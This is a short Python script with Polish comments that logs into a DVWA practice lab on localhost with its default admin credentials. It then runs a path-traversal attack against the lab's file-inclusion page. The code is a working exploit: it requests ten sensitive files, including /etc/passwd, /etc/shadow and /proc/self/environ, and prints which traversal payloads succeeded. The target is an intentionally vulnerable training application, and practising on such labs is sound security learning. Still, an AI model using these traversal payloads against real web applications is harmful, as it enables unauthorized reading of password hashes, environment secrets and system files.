

import requests
from bs4 import BeautifulSoup

session = requests.Session() #tworzymy sesje http


#zdobycie tokena
login_page = session.get('http://localhost/login.php') #pobieramy strone logowania
soup = BeautifulSoup(login_page.text, 'html.parser') #analizujemy ja
token = soup.find('input', {'name': 'user_token'})['value'] #wyszukujemy tam user_token i zapisujemy jego wartosc


#deklaracja danych logowania do DVWA i tokenu
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login', #nazwa przycisku do logowania
    'user_token': token
}

session.post('http://localhost/login.php', data=login_data) #wysylamy dane logowania na strone



#deklaracja konkretow
url='http://localhost/vulnerabilities/fi/?page=../../../../../../../../../../../../'

payloads = [
    "etc/passwd",                 # lista użytkowników
    "etc/shadow",                 # hasła (zaszyfrowane)
    "etc/hostname",               # nazwa hosta
    "etc/hosts",                  # lokalne wpisy DNS
    "etc/os-release",            # informacje o systemie
    "etc/issue",                 # baner logowania
    "proc/cpuinfo",              # informacje o CPU
    "proc/version",             # wersja jądra
    "proc/mounts",              # zamontowane systemy plików
    "proc/self/environ"         # zmienne środowiskowe
]

answers = [
    "root:x:",                   # przewidywany wpis użytkownika root
    "root:*",                    # zaszyfrowane hasło lub zablokowane konto
    "hostname",                  # np. `my-server`
    "127.0.0.1",                 # lokalny adres IP
    "PRETTY_NAME",               # np. `Ubuntu`, `Debian` itp.
    "Ubuntu",                    # często w /etc/issue
    "processor",                 # słowo w cpuinfo
    "Linux version",            # początek linii w proc/version
    "/dev/",                     # ścieżki zamontowane
    "PATH="                      # w zmiennych środowiskowych
]




licznik=0
for i in range(len(payloads)):
    link=url+payloads[i]
    odp=session.get(link, timeout=5)

    if answers[i] in odp.text:
        print (f"Payload {payloads[i]} prawdopodobnie działa!")
        licznik=licznik+1
                       
                                    

print (f"Na {len(payloads)} zadziałało {licznik} payloadów.")


